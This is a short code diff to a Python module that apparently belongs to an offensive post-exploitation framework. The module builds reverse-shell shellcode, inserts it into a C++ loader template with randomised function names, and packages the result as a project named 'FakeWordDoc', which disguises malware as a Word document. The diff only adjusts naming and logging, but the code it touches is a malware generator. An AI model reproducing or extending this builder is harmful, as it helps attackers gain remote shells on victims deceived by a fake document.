@@ -47,11 +47,10 @@ class PostModule(PostPythonModule):
         loadername = self.param("LoaderName")  # abcd.exe
         shellcode = self.generate_hex_reverse_shellcode_by_handler()
         FUNCTION = self.random_str(8)
-        FUNCTION1 = self.random_str(9)
-        logger.info("生成c++源码")
+        # FUNCTION1 = self.random_str(9)
         source_code = self.generate_context_by_template(filename="main.cpp", SHELLCODE_STR=shellcode, FUNCTION=FUNCTION,
                                                         LOADERFILE=loadername)
-
+        logger.info("c++源码: {}".format(source_code))
         filename = f"FakeWordDoc_{int(time.time())}.zip"
         self.write_zip_vs_project(filename, source_code)
 
